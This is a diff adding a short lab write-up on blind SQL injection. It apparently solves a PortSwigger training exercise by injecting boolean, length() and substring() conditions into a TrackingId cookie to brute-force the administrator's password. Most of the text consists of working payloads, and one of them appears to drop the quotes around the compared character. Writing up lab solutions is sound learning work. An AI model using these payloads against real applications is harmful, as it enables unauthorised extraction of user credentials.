@@ -1,0 +1,33 @@
+#Step 1: After the TrackingId value write :
+
+6CDzCCQDL1zVFRNz' AND 1=1--   [this will return "Welcome Back" message which means query has been executed successfully.
+
+6CDzCCQDL1zVFRNz' AND 1=2--   [this will not return "Welcome Back" message, becoz condition is wrong as we know "AND" need both statement true.]
+
+We can also do the same thing with "OR" like -
+
+xyz' OR 1=1--	[this will return "Welcome Back" message]
+
+xyz' OR 1=2--	[this will not return "Welcome Back" message]
+
+
+
+#Step 2: Determine the length of administrator's password 
+
+6CDzCCQDL1zVFRNz' and length((select password from users where username = 'administrator')) = 1--
+
+use intruder in place of '1' ($1$) and determine the length using bruteforce technique (1-100)
+
+I found, 20 is the length of password.
+
+
+
+#Step 3: Bruteforce the password using
+
+6CDzCCQDL1zVFRNz' and substring((select password from users where username = 'administrator'), 1, 1) = a--
+
+use intruder in place of 'a' ($a$) and determine the first character of password and then second character and so on.
+
+I used a python program to bruteforce the password. You can also use the program with this link :- https://github.com/amanchauhan47/PortSwigger-Learning/blob/main/blind_sqli.py
+
+And BOOM!!!, This will print the password for your administrator....
